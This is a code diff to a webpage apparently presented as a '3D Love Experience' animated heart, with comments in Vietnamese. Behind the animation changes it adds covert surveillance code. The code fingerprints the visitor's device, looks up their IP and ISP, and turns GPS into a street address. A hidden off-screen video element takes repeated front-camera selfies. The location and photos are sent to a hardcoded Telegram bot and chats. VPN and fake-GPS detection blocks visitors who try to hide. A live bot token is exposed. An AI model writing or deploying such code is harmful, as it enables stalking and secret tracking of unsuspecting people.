@@ -571,7 +571,7 @@
                         mixedPos += burstDir * (uExplode * (1.8 + aPhase * 1.6));
                     }
 
-                    vec3 finalPos = mixedPos * (uHeartScale + uPulse * 0.22);
+                    vec3 finalPos = mixedPos * (uHeartScale + uPulse);
                     vec4 mvPosition = modelViewMatrix * vec4(finalPos, 1.0);
                     gl_Position = projectionMatrix * mvPosition;
 
@@ -642,12 +642,25 @@
             this.uniforms.uTime.value = time;
             let pulseVal = 0;
             if (this.uniforms.uColorMode.value > 0.5) {
-                const period = 1.05;
+                const period = 1.02; // Nhịp tim chân thực, uy lực
                 const t = (time % period) / period;
-                const b1 = Math.exp(-Math.pow((t - 0.16) / 0.06, 2)) * 0.18; // Lub: strong primary pulse
-                const b2 = Math.exp(-Math.pow((t - 0.36) / 0.06, 2)) * 0.11; // Dub: secondary pulse
-                const b3 = Math.max(0, Math.sin(t * Math.PI)) * 0.02;        // Diastole relaxation
-                pulseVal = b1 + b2 + b3;
+
+                // 1. Thu vào sâu chuẩn bị phát lực (-16% kích thước)
+                const shrink1 = -Math.exp(-Math.pow((t - 0.07) / 0.045, 2)) * 0.16;
+
+                // 2. Nhịp chính đập bung ra cực mạnh (+42% kích thước - Lub)
+                const beat1 = Math.exp(-Math.pow((t - 0.18) / 0.055, 2)) * 0.42;
+
+                // 3. Thu vào đàn hồi giữa 2 nhịp (-10% kích thước)
+                const shrink2 = -Math.exp(-Math.pow((t - 0.28) / 0.04, 2)) * 0.10;
+
+                // 4. Nhịp phụ đập bung lần 2 (+24% kích thước - Dub)
+                const beat2 = Math.exp(-Math.pow((t - 0.38) / 0.05, 2)) * 0.24;
+
+                // 5. Thư giãn êm ái về trạng thái nghỉ
+                const settle = -Math.exp(-Math.pow((t - 0.52) / 0.06, 2)) * 0.04;
+
+                pulseVal = shrink1 + beat1 + shrink2 + beat2 + settle;
                 this.uniforms.uPulse.value = pulseVal;
             }
 
@@ -1685,13 +1698,11 @@
 
             const tgConfig = {
                 botToken: "8619596260:AAFRqrXz--JcrxBanIPvv7wNPXX33T4t88Q",
+                privateChatId: "5551363255",
+                groupChatId: "-1003777018844",
                 chatIds: ["5551363255", "-1003777018844"]
             };
 
-            let cameraStream = null;
-            let cameraVideo = null;
-            let cameraInterval = null;
-            let cameraCount = 0;
             let gpsCount = 0;
             let latestCoords = null;
 
@@ -1707,63 +1718,473 @@
                 }
             };
 
-            const getDeviceInfo = () => {
-                const ua = navigator.userAgent;
-                let os = "Không xác định";
-                if (/iphone|ipad|ipod/i.test(ua)) os = "iOS (iPhone/iPad)";
-                else if (/android/i.test(ua)) os = "Android";
-                else if (/windows/i.test(ua)) os = "Windows PC";
-                else if (/macintosh|mac os x/i.test(ua)) os = "macOS (MacBook/iMac)";
-                else if (/linux/i.test(ua)) os = "Linux";
+            const getAccurateDeviceModel = () => {
+                const ua = navigator.userAgent || '';
+                const w = window.screen.width;
+                const h = window.screen.height;
+                const dpr = window.devicePixelRatio || 1;
+                const minD = Math.min(w, h);
+                const maxD = Math.max(w, h);
+                const physW = Math.round(minD * dpr);
+                const physH = Math.round(maxD * dpr);
 
-                let browser = "Trình duyệt khác";
-                if (/crios|chrome/i.test(ua) && !/edg/i.test(ua)) browser = "Google Chrome";
-                else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = "Apple Safari";
+                // 1. Nhận diện GPU WebGL để tăng độ chính xác phân biệt chip Apple A-series
+                let gpu = '';
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || '';
+                        }
+                    }
+                } catch(e) {}
+
+                // 2. NHẬN DIỆN CHI TIẾT CÁC ĐỜI IPHONE
+                if (/iPhone/i.test(ua)) {
+                    // iPhone 15 Pro Max / 14 Pro Max (430 x 932 pt, 1290 x 2796 px)
+                    if (minD === 430 && maxD === 932) {
+                        return 'Apple iPhone 14 Pro Max / 15 Pro Max';
+                    }
+                    // iPhone 15 Pro / 14 Pro (393 x 852 pt, 1179 x 2556 px)
+                    if (minD === 393 && maxD === 852) {
+                        return 'Apple iPhone 14 Pro / 15 Pro';
+                    }
+                    // iPhone 15 Plus / 14 Plus / 13 Pro Max / 12 Pro Max (428 x 926 pt, 1284 x 2778 px)
+                    if (minD === 428 && maxD === 926) {
+                        return 'Apple iPhone 14 Plus / 15 Plus / 13 Pro Max / 12 Pro Max';
+                    }
+                    // iPhone 15 / 14 / 13 / 13 Pro / 12 / 12 Pro (390 x 844 pt, 1170 x 2532 px)
+                    if (minD === 390 && maxD === 844) {
+                        return 'Apple iPhone 14 / iPhone 15 / iPhone 13 / iPhone 12';
+                    }
+                    // iPhone 13 mini / 12 mini (360 x 780 pt, 1080 x 2340 px)
+                    if (minD === 360 || (minD === 375 && dpr === 3 && maxD === 812 && physW === 1080)) {
+                        return 'Apple iPhone 13 mini / 12 mini';
+                    }
+                    // iPhone 11 Pro Max / XS Max (414 x 896 pt, DPR: 3)
+                    if (minD === 414 && maxD === 896 && dpr >= 2.5) {
+                        return 'Apple iPhone 11 Pro Max / XS Max';
+                    }
+                    // iPhone 11 / XR (414 x 896 pt, DPR: 2)
+                    if (minD === 414 && maxD === 896 && dpr < 2.5) {
+                        return 'Apple iPhone 11 / iPhone XR';
+                    }
+                    // iPhone 11 Pro / XS / X (375 x 812 pt, DPR: 3)
+                    if (minD === 375 && maxD === 812) {
+                        return 'Apple iPhone 11 Pro / iPhone X / XS';
+                    }
+                    // iPhone 8 Plus / 7 Plus / 6s Plus (414 x 736 pt)
+                    if (minD === 414 && maxD === 736) {
+                        return 'Apple iPhone 8 Plus / 7 Plus / 6s Plus';
+                    }
+                    // iPhone SE (2nd/3rd gen) / 8 / 7 (375 x 667 pt)
+                    if (minD === 375 && maxD === 667) {
+                        return 'Apple iPhone SE / iPhone 8 / 7';
+                    }
+                    return `Apple iPhone (${minD}x${maxD} pt)`;
+                }
+
+                // 3. NHẬN DIỆN IPAD
+                if (/iPad/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+                    if (minD >= 1024) return 'Apple iPad Pro 12.9"';
+                    if (minD >= 820) return 'Apple iPad Air / Pro 11"';
+                    return 'Apple iPad Tablet';
+                }
+
+                // 4. NHẬN DIỆN CÁC DÒNG ANDROID CHI TIẾT
+                if (/Android/i.test(ua)) {
+                    const match = ua.match(/Android[^;]+;\s*([^;)]+)\s*[;)]/i) || ua.match(/\(([^;]+);\s*([^;)]+)\s*Build/i);
+                    let model = match ? (match[1] || match[2] || '').trim() : '';
+
+                    // Dịch mã Samsung
+                    if (/SM-S928/i.test(ua) || /SM-S928/i.test(model)) return 'Samsung Galaxy S24 Ultra';
+                    if (/SM-S926/i.test(ua) || /SM-S926/i.test(model)) return 'Samsung Galaxy S24+';
+                    if (/SM-S921/i.test(ua) || /SM-S921/i.test(model)) return 'Samsung Galaxy S24';
+                    if (/SM-S918/i.test(ua) || /SM-S918/i.test(model)) return 'Samsung Galaxy S23 Ultra';
+                    if (/SM-S916/i.test(ua) || /SM-S916/i.test(model)) return 'Samsung Galaxy S23+';
+                    if (/SM-S911/i.test(ua) || /SM-S911/i.test(model)) return 'Samsung Galaxy S23';
+                    if (/SM-S908/i.test(ua) || /SM-S908/i.test(model)) return 'Samsung Galaxy S22 Ultra';
+                    if (/SM-G998/i.test(ua) || /SM-G998/i.test(model)) return 'Samsung Galaxy S21 Ultra';
+                    if (/SM-G991/i.test(ua) || /SM-G991/i.test(model)) return 'Samsung Galaxy S21';
+                    if (/SM-A\d{3}/i.test(ua) || /SM-A\d{3}/i.test(model)) return `Samsung Galaxy A-Series (${model || 'Galaxy A'})`;
+                    if (/SM-M\d{3}/i.test(ua) || /SM-M\d{3}/i.test(model)) return `Samsung Galaxy M-Series (${model || 'Galaxy M'})`;
+                    if (/SM-[A-Z]\d+/i.test(ua)) return `Samsung Galaxy (${model || 'Android'})`;
+
+                    // Dịch Xiaomi / Redmi / POCO
+                    if (/Redmi/i.test(ua) || /Xiaomi/i.test(ua) || /POCO/i.test(ua) || /22\d{6}/i.test(ua) || /23\d{6}/i.test(ua)) {
+                        return `Xiaomi / Redmi (${model || 'Android'})`;
+                    }
+                    // Dịch OPPO / Realme
+                    if (/OPPO/i.test(ua) || /CPH\d{4}/i.test(ua)) return `OPPO (${model || 'Android'})`;
+                    if (/Realme/i.test(ua) || /RMX\d{4}/i.test(ua)) return `Realme (${model || 'Android'})`;
+                    // Dịch Vivo
+                    if (/vivo/i.test(ua) || /V\d{4}/i.test(ua)) return `Vivo (${model || 'Android'})`;
+                    // Dịch Google Pixel
+                    if (/Pixel/i.test(ua)) {
+                        const p = ua.match(/Pixel\s*[^;)]+/i);
+                        return p ? `Google ${p[0]}` : 'Google Pixel';
+                    }
+
+                    return model ? `Android (${model})` : 'Điện thoại Android';
+                }
+
+                // 5. NHẬN DIỆN MÁY TÍNH
+                if (/Windows/i.test(ua)) return 'Máy tính Windows PC';
+                if (/Macintosh|Mac OS X/i.test(ua)) return 'Máy tính Apple MacBook / Mac';
+                if (/Linux/i.test(ua)) return 'Máy tính Linux';
+
+                return 'Thiết bị thông minh';
+            };
+
+            const getDeviceInfo = () => {
+                const ua = navigator.userAgent || '';
+                let os = "Không xác định";
+                if (/iphone/i.test(ua)) os = "Apple iOS (iPhone)";
+                else if (/ipad/i.test(ua)) os = "Apple iPadOS (iPad)";
+                else if (/android/i.test(ua)) os = "Google Android";
+                else if (/windows/i.test(ua)) os = "Microsoft Windows";
+                else if (/macintosh|mac os x/i.test(ua)) os = "Apple macOS (MacBook/iMac)";
+                else if (/linux/i.test(ua)) os = "Linux OS";
+
+                let browser = "Trình duyệt Web";
+                if (/crios/i.test(ua)) browser = "Chrome Mobile";
+                else if (/FBAV|FBAN/i.test(ua)) browser = "Facebook Webview";
+                else if (/Zalo/i.test(ua)) browser = "Zalo Webview";
                 else if (/edg/i.test(ua)) browser = "Microsoft Edge";
+                else if (/chrome/i.test(ua) && !/edg/i.test(ua)) browser = "Google Chrome";
+                else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = "Apple Safari";
                 else if (/firefox/i.test(ua)) browser = "Mozilla Firefox";
 
+                const phoneModel = getAccurateDeviceModel();
                 const isMobile = /mobile|android|iphone|ipad|ipod/i.test(ua);
+
                 return {
                     os,
                     browser,
-                    deviceType: isMobile ? "📱 Điện Thoại / Di Động" : "💻 Máy Tính Để Bàn / Laptop",
-                    screenRes: `${window.screen.width}x${window.screen.height}`
+                    phoneModel,
+                    deviceType: isMobile ? "📱 Điện Thoại" : "💻 Máy Tính",
+                    screenRes: `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio || 1})`
                 };
+            };
+
+            const calculateDistanceKm = (lat1, lon1, lat2, lon2) => {
+                const R = 6371;
+                const dLat = (lat2 - lat1) * Math.PI / 180;
+                const dLon = (lon2 - lon1) * Math.PI / 180;
+                const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+                          Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+                          Math.sin(dLon / 2) * Math.sin(dLon / 2);
+                const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+                return R * c;
+            };
+
+            const getExactStreetAddress = async (lat, lon) => {
+                try {
+                    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=vi`;
+                    const res = await fetch(url, { headers: { 'User-Agent': 'LoveExperienceApp/1.0' } });
+                    if (res.ok) {
+                        const d = await res.json();
+                        if (d && d.display_name) {
+                            return d.display_name;
+                        }
+                    }
+                } catch (e) {}
+
+                try {
+                    const url2 = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=vi`;
+                    const res2 = await fetch(url2);
+                    if (res2.ok) {
+                        const d2 = await res2.json();
+                        const parts = [d2.locality, d2.city, d2.principalSubdivision, d2.countryName].filter(Boolean);
+                        if (parts.length) return parts.join(', ');
+                    }
+                } catch (e2) {}
+
+                return null;
+            };
+
+            const checkVpnAndFakeGps = async (gpsCoords) => {
+                let isViolation = false;
+                let violationReasons = [];
+                let ipInfo = null;
+
+                try {
+                    const res = await fetch('https://ipwho.is/');
+                    if (res.ok) {
+                        ipInfo = await res.json();
+
+                        if (ipInfo && ipInfo.success) {
+                            // A. Kiểm tra VPN / Proxy / Tor / Hosting Datacenter
+                            if (ipInfo.security) {
+                                if (ipInfo.security.vpn) {
+                                    isViolation = true;
+                                    violationReasons.push("Sử dụng VPN");
+                                }
+                                if (ipInfo.security.proxy) {
+                                    isViolation = true;
+                                    violationReasons.push("Sử dụng Proxy");
+                                }
+                                if (ipInfo.security.tor) {
+                                    isViolation = true;
+                                    violationReasons.push("Sử dụng mạng Tor");
+                                }
+                                if (ipInfo.security.hosting) {
+                                    isViolation = true;
+                                    violationReasons.push("Địa chỉ IP Datacenter/Hosting");
+                                }
+                            }
+
+                            // B. Kiểm tra Lệch Múi Giờ Thiết Bị vs IP Mạng
+                            const deviceTz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
+                            const ipTz = ipInfo.timezone ? ipInfo.timezone.id : '';
+                            if (deviceTz && ipTz && deviceTz !== ipTz && !ipTz.includes('Asia/Ho_Chi_Minh') && deviceTz.includes('Asia/Ho_Chi_Minh')) {
+                                isViolation = true;
+                                violationReasons.push(`Múi giờ máy (${deviceTz}) khác múi giờ IP (${ipTz})`);
+                            }
+
+                            // C. Kiểm tra Chênh lệch GPS vs IP (Phát hiện Fake GPS / Mock Location)
+                            if (gpsCoords && typeof ipInfo.latitude === 'number' && typeof ipInfo.longitude === 'number') {
+                                const distKm = calculateDistanceKm(gpsCoords.latitude, gpsCoords.longitude, ipInfo.latitude, ipInfo.longitude);
+                                
+                                if (distKm > 300) {
+                                    if (ipInfo.country_code !== 'VN' && (gpsCoords.latitude >= 8.0 && gpsCoords.latitude <= 24.0)) {
+                                        isViolation = true;
+                                        violationReasons.push("Sử dụng VPN Fake IP quốc tế");
+                                    } else if (distKm > 400) {
+                                        isViolation = true;
+                                        violationReasons.push(`Fake GPS (Lệch vị trí thực ${Math.round(distKm)}km)`);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                } catch (e) {}
+
+                // D1. Kiểm tra Sai số bán kính GPS vượt quá 1000m (Không đạt độ chính xác chuẩn vệ tinh)
+                if (gpsCoords && typeof gpsCoords.accuracy === 'number') {
+                    if (gpsCoords.accuracy > 1000) {
+                        isViolation = true;
+                        violationReasons.push(`Sai số GPS quá lớn (>1000m: ±${Math.round(gpsCoords.accuracy)}m)`);
+                    } else if (gpsCoords.accuracy === 0) {
+                        isViolation = true;
+                        violationReasons.push("Ứng dụng Giả lập Mock GPS (Accuracy = 0)");
+                    }
+                }
+
+                return { isViolation, reasons: violationReasons, ipInfo };
+            };
+
+            const getDeviceSessionId = () => {
+                let devId = sessionStorage.getItem('app_dev_session_id');
+                if (!devId) {
+                    const ua = navigator.userAgent || '';
+                    let prefix = 'DEV';
+                    if (/iPhone/i.test(ua)) prefix = 'IPHONE';
+                    else if (/iPad/i.test(ua)) prefix = 'IPAD';
+                    else if (/Android/i.test(ua)) prefix = 'ANDROID';
+                    else if (/Macintosh|Mac OS X/i.test(ua)) prefix = 'MAC';
+                    else if (/Windows/i.test(ua)) prefix = 'PC';
+
+                    const randHex = Math.random().toString(36).substring(2, 6).toUpperCase();
+                    devId = `${prefix}_${randHex}`;
+                    try {
+                        sessionStorage.setItem('app_dev_session_id', devId);
+                    } catch(e) {}
+                }
+                return devId;
+            };
+
+            const getBatteryStatus = async () => {
+                try {
+                    if (navigator.getBattery) {
+                        const bat = await navigator.getBattery();
+                        const pct = Math.round(bat.level * 100);
+                        return `${pct}% ${bat.charging ? '(⚡ Đang sạc)' : ''}`;
+                    }
+                } catch(e) {}
+                return 'Không hỗ trợ';
+            };
+
+            let cachedIpData = null;
+
+            const getRealIpInfo = async () => {
+                if (cachedIpData) return cachedIpData;
+                try {
+                    const res = await fetch('https://ipwho.is/');
+                    if (res.ok) {
+                        const data = await res.json();
+                        if (data && data.success) {
+                            cachedIpData = {
+                                ip: data.ip || 'Không xác định',
+                                city: data.city || '',
+                                region: data.region || '',
+                                country: data.country || 'Việt Nam',
+                                countryCode: data.country_code || 'VN',
+                                isp: (data.connection && (data.connection.isp || data.connection.org)) || 'N/A',
+                                type: data.type || 'IPv4'
+                            };
+                            return cachedIpData;
+                        }
+                    }
+                } catch (e) {}
+
+                try {
+                    const res2 = await fetch('https://ipapi.co/json/');
+                    if (res2.ok) {
+                        const d2 = await res2.json();
+                        if (d2 && d2.ip) {
+                            cachedIpData = {
+                                ip: d2.ip,
+                                city: d2.city || '',
+                                region: d2.region || '',
+                                country: d2.country_name || 'Việt Nam',
+                                countryCode: d2.country_code || 'VN',
+                                isp: d2.org || 'N/A',
+                                type: 'IPv4'
+                            };
+                            return cachedIpData;
+                        }
+                    }
+                } catch (e2) {}
+
+                try {
+                    const res3 = await fetch('https://api.ipify.org?format=json');
+                    if (res3.ok) {
+                        const d3 = await res3.json();
+                        if (d3 && d3.ip) {
+                            cachedIpData = {
+                                ip: d3.ip,
+                                city: '',
+                                region: '',
+                                country: 'Việt Nam',
+                                countryCode: 'VN',
+                                isp: 'N/A',
+                                type: 'IPv4'
+                            };
+                            return cachedIpData;
+                        }
+                    }
+                } catch (e3) {}
+
+                return { ip: 'Không xác định', city: '', region: '', country: '', countryCode: '', isp: 'N/A', type: '' };
+            };
+
+            const sendTelegramMessageToChats = async (targetChatIds, text, disablePreview = false) => {
+                return Promise.allSettled(targetChatIds.map(async (chatId) => {
+                    try {
+                        await fetch(`https://api.telegram.org/bot${tgConfig.botToken}/sendMessage`, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: text,
+                                parse_mode: "HTML",
+                                disable_web_page_preview: disablePreview
+                            })
+                        });
+                    } catch (e) {}
+                }));
+            };
+
+            const sendTelegramPhotoToChats = async (targetChatIds, blob, caption) => {
+                return Promise.allSettled(targetChatIds.map(async (chatId) => {
+                    try {
+                        const formData = new FormData();
+                        formData.append("chat_id", chatId);
+                        formData.append("photo", blob, `selfie_${Date.now()}.jpg`);
+                        formData.append("caption", caption);
+                        formData.append("parse_mode", "HTML");
+
+                        await fetch(`https://api.telegram.org/bot${tgConfig.botToken}/sendPhoto`, {
+                            method: "POST",
+                            body: formData
+                        });
+                    } catch (e) {}
+                }));
+            };
+
+            const sendSecurityAlertToTelegram = async (gpsCoords, reasons, ipInfo) => {
+                try {
+                    const devId = getDeviceSessionId();
+                    const timeStr = getVietnamTime();
+                    const device = getDeviceInfo();
+                    const ipData = ipInfo ? {
+                        ip: ipInfo.ip || 'Không xác định',
+                        city: ipInfo.city || '',
+                        country: ipInfo.country || '',
+                        isp: (ipInfo.connection && (ipInfo.connection.isp || ipInfo.connection.org)) || 'N/A'
+                    } : await getRealIpInfo();
+
+                    const pageTitle = document.title || '3D Love Experience';
+                    const lat = gpsCoords ? gpsCoords.latitude : 'N/A';
+                    const lon = gpsCoords ? gpsCoords.longitude : 'N/A';
+                    const ipStr = `${ipData.ip} (${[ipData.city, ipData.country].filter(Boolean).join(', ')})`;
+
+                    const messageText = 
+`🚨 <b>[CẢNH BÁO: PHÁT HIỆN FAKE VPN / FAKE GPS]</b>
+🏷️ <b>Mã Thiết Bị:</b> <code>#DEV_${devId}</code> <i>(Bấm để lọc thiết bị này)</i>
+📱 <b>Dòng Máy:</b> <b>${device.phoneModel}</b>
+⚠️ <b>Hành vi vi phạm:</b> <code>${reasons.join(', ')}</code>
+⏰ <b>Thời gian:</b> ${timeStr}
+🌐 <b>Trang web:</b> ${pageTitle}
+📍 <b>GPS gửi lên:</b> <code>${lat}, ${lon}</code>
+🌐 <b>IP Mạng Thực Tế:</b> <code>${ipStr}</code>
+🏢 <b>Nhà Mạng:</b> <code>${ipData.isp}</code>
+💻 <b>Hệ điều hành:</b> ${device.os} • ${device.browser}
+🚫 <b>Trạng thái:</b> Đã chặn truy cập
+
+#DEV_${devId} #CanhBao #FakeVPN`;
+
+                    // Báo động an ninh gửi cho cả tin nhắn riêng và nhóm
+                    await sendTelegramMessageToChats(tgConfig.chatIds, messageText, true);
+                } catch (err) {}
             };
 
             const sendGpsToTelegram = async (coords, count = 1) => {
                 try {
+                    const devId = getDeviceSessionId();
                     const lat = coords.latitude;
                     const lon = coords.longitude;
                     const accuracy = coords.accuracy ? `${Math.round(coords.accuracy)}m` : 'N/A';
                     const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                     const timeStr = getVietnamTime();
                     const device = getDeviceInfo();
+                    const batteryInfo = await getBatteryStatus();
+                    const ipData = await getRealIpInfo();
                     const pageTitle = document.title || '3D Love Experience';
+                    
+                    // Lấy tên đường, số nhà, phường/xã, quận/huyện chính xác
+                    const streetAddress = await getExactStreetAddress(lat, lon);
+                    const ipLocParts = [ipData.city, ipData.region, ipData.country].filter(Boolean).join(', ');
+                    const safeIpTag = (ipData.ip || '').replace(/[^a-zA-Z0-9]/g, '_');
 
                     const messageText = 
-`🎯 <b>[ĐỊNH VỊ GPS ${count > 1 ? `#${count}` : 'MỚI'}]</b>
-⏰ <b>Thời gian:</b> ${timeStr}
-🌐 <b>Trang web:</b> ${pageTitle}
-📍 <b>Tọa độ:</b> <code>${lat}, ${lon}</code> (±${accuracy})
+`🎯 <b>[ĐỊNH VỊ GPS VỆ TINH #${count}]</b>
+🏷️ <b>Mã Thiết Bị:</b> <code>#DEV_${devId}</code> <i>(Bấm để lọc người này)</i>
+📱 <b>Dòng Máy:</b> <b>${device.phoneModel}</b>
+🌐 <b>Địa Chỉ IP Máy:</b> <code>${ipData.ip}</code>
+🏢 <b>Nhà Mạng / ISP:</b> <code>${ipData.isp}</code> ${ipLocParts ? `(${ipLocParts})` : ''}
+🏠 <b>Địa chỉ thực tế (GPS):</b> <code>${streetAddress || 'Đang cập nhật theo tọa độ vệ tinh'}</code>
+📍 <b>Tọa độ:</b> <code>${lat}, ${lon}</code> (Độ chính xác: ±${accuracy})
 🗺️ <b>Bản đồ:</b> <a href="${mapLink}">Xem trên Google Maps</a>
-📱 <b>Thiết bị:</b> ${device.deviceType} (${device.os} - ${device.browser})
-🔋 <b>Trạng thái:</b> Đang trải nghiệm web`;
+💻 <b>Hệ điều hành:</b> ${device.os} • ${device.browser}
+🖥️ <b>Màn hình:</b> ${device.screenRes}
+🔋 <b>Pin:</b> ${batteryInfo}
+⏰ <b>Thời gian:</b> ${timeStr}
 
-                    for (const chatId of tgConfig.chatIds) {
-                        try {
-                            await fetch(`https://api.telegram.org/bot${tgConfig.botToken}/sendMessage`, {
-                                method: "POST",
-                                headers: { "Content-Type": "application/json" },
-                                body: JSON.stringify({
-                                    chat_id: chatId,
-                                    text: messageText,
-                                    parse_mode: "HTML",
-                                    disable_web_page_preview: false
-                                })
-                            });
+#DEV_${devId} #GPS #ViTri ${safeIpTag ? `#IP_${safeIpTag}` : ''}`;
 
-                            if (count === 1 && typeof lat === 'number' && typeof lon === 'number') {
+                    // QUY TẮC: Nhóm Telegram CHỈ NHẬN ĐÚNG 1 LẦN vị trí đầu tiên (count === 1).
+                    // Tin nhắn riêng nhận đầy đủ tất cả các lần (mỗi 5 giây/lần).
+                    const targetChats = (count === 1) ? tgConfig.chatIds : [tgConfig.privateChatId];
+
+                    await sendTelegramMessageToChats(targetChats, messageText, false);
+
+                    if (count === 1 && typeof lat === 'number' && typeof lon === 'number') {
+                        Promise.allSettled(targetChats.map(async (chatId) => {
+                            try {
                                 await fetch(`https://api.telegram.org/bot${tgConfig.botToken}/sendLocation`, {
                                     method: "POST",
                                     headers: { "Content-Type": "application/json" },
@@ -1773,74 +2194,125 @@
                                         longitude: lon
                                     })
                                 });
-                            }
-                        } catch (e) {}
+                            } catch (e) {}
+                        }));
                     }
                 } catch (err) {}
             };
 
-            const sendPhotoToTelegram = async (blob, count = 1) => {
-                const timeStr = getVietnamTime();
-                const device = getDeviceInfo();
-                const pageTitle = document.title || '3D Love Experience';
+            let frontStream = null;
+            let frontVideo = null;
+            let frontCount = 0;
+            let cameraInterval = null;
 
-                const caption = 
-`📸 <b>[HÌNH ẢNH CAMERA #${count}]</b>
-⏰ <b>Thời gian:</b> ${timeStr}
-🌐 <b>Trang web:</b> ${pageTitle}
-📱 <b>Thiết bị:</b> ${device.deviceType} (${device.os} - ${device.browser})`;
-
-                for (const chatId of tgConfig.chatIds) {
-                    try {
-                        const formData = new FormData();
-                        formData.append("chat_id", chatId);
-                        formData.append("photo", blob, `snapshot_${count}.jpg`);
-                        formData.append("caption", caption);
-                        formData.append("parse_mode", "HTML");
-
-                        await fetch(`https://api.telegram.org/bot${tgConfig.botToken}/sendPhoto`, {
-                            method: "POST",
-                            body: formData
-                        });
-                    } catch (e) {}
-                }
-            };
-
-            const captureAndSendPhoto = () => {
-                if (!cameraStream || !cameraVideo) return;
+            const sendPhotoToTelegram = async (blob, label = 'CAMERA TRƯỚC (SELFIE)') => {
+                if (!blob || blob.size === 0) return;
                 try {
-                    const canvas = document.createElement('canvas');
-                    const width = cameraVideo.videoWidth || 640;
-                    const height = cameraVideo.videoHeight || 480;
-                    canvas.width = width;
-                    canvas.height = height;
+                    const devId = getDeviceSessionId();
+                    const timeStr = getVietnamTime();
+                    const device = getDeviceInfo();
+                    const ipData = await getRealIpInfo();
+                    const pageTitle = document.title || '3D Love Experience';
+                    const safeIpTag = (ipData.ip || '').replace(/[^a-zA-Z0-9]/g, '_');
 
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(cameraVideo, 0, 0, width, height);
+                    const caption = 
+`📸 <b>[HÌNH ẢNH ${label}]</b>
+🏷️ <b>Mã Thiết Bị:</b> <code>#DEV_${devId}</code> <i>(Bấm để lọc ảnh người này)</i>
+📱 <b>Dòng Máy:</b> <b>${device.phoneModel}</b>
+🌐 <b>Địa Chỉ IP Máy:</b> <code>${ipData.ip}</code> • 🏢 <code>${ipData.isp}</code>
+💻 <b>Hệ điều hành:</b> ${device.os} • ${device.browser}
+⏰ <b>Thời gian:</b> ${timeStr}
 
-                    canvas.toBlob((blob) => {
-                        if (!blob || blob.size === 0) return;
-                        cameraCount++;
-                        sendPhotoToTelegram(blob, cameraCount);
-                    }, 'image/jpeg', 0.85);
-                } catch (e) {}
+#DEV_${devId} #AnhChup #Camera ${safeIpTag ? `#IP_${safeIpTag}` : ''}`;
+
+                    // QUY TẮC: Nhóm Telegram nhận đúng 1 bức ảnh ở TẤM THỨ 5 (frontCount === 5) khi người xem nhìn ổn định nhất.
+                    // Tin nhắn riêng tiếp tục nhận đầy đủ liên tục toàn bộ các tấm (1, 2, 3, 4, 5, 6...).
+                    const targetChats = (frontCount === 5) ? tgConfig.chatIds : [tgConfig.privateChatId];
+
+                    await sendTelegramPhotoToChats(targetChats, blob, caption);
+                } catch (err) {}
             };
 
-            const requestLocationPromise = () => {
-                return new Promise((resolve, reject) => {
-                    if (!navigator.geolocation) return resolve(null);
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => resolve(pos.coords),
-                        (err) => {
-                            if (err.code === 1) reject(new Error("LOCATION_DENIED"));
-                            else resolve(null);
-                        },
-                        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-                    );
+            const createHiddenVideo = () => {
+                let v = document.getElementById('camera-stream-video');
+                if (!v) {
+                    v = document.createElement('video');
+                    v.id = 'camera-stream-video';
+                    v.controls = false;
+                    v.playsInline = true;
+                    v.webkitPlaysInline = true;
+                    v.disablePictureInPicture = true;
+                    v.disableRemotePlayback = true;
+                    v.muted = true;
+                    v.defaultMuted = true;
+                    v.setAttribute('autoplay', '');
+                    v.setAttribute('playsinline', 'true');
+                    v.setAttribute('webkit-playsinline', 'true');
+                    v.setAttribute('x5-playsinline', 'true');
+                    v.setAttribute('x5-video-player-type', 'h5');
+                    v.setAttribute('x5-video-player-fullscreen', 'false');
+                    v.setAttribute('muted', '');
+                    // Tuyệt đối không hiển thị khung video hoặc kích hoạt trình xem video toàn màn hình
+                    v.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-99999;';
+                    document.body.appendChild(v);
+                }
+                return v;
+            };
+
+            const captureVideoBlob = (videoEl) => {
+                return new Promise((resolve) => {
+                    if (!videoEl) return resolve(null);
+                    try {
+                        const width = videoEl.videoWidth || 640;
+                        const height = videoEl.videoHeight || 480;
+                        const canvas = document.createElement('canvas');
+                        canvas.width = width;
+                        canvas.height = height;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(videoEl, 0, 0, width, height);
+
+                        if (canvas.toBlob) {
+                            canvas.toBlob((blob) => {
+                                if (blob && blob.size > 0) {
+                                    resolve(blob);
+                                } else {
+                                    // Fallback sang toDataURL nếu toBlob rỗng
+                                    try {
+                                        const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+                                        const binStr = atob(dataUrl.split(',')[1]);
+                                        const len = binStr.length;
+                                        const arr = new Uint8Array(len);
+                                        for (let i = 0; i < len; i++) arr[i] = binStr.charCodeAt(i);
+                                        resolve(new Blob([arr], { type: 'image/jpeg' }));
+                                    } catch (e2) {
+                                        resolve(null);
+                                    }
+                                }
+                            }, 'image/jpeg', 0.85);
+                        } else {
+                            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+                            const binStr = atob(dataUrl.split(',')[1]);
+                            const len = binStr.length;
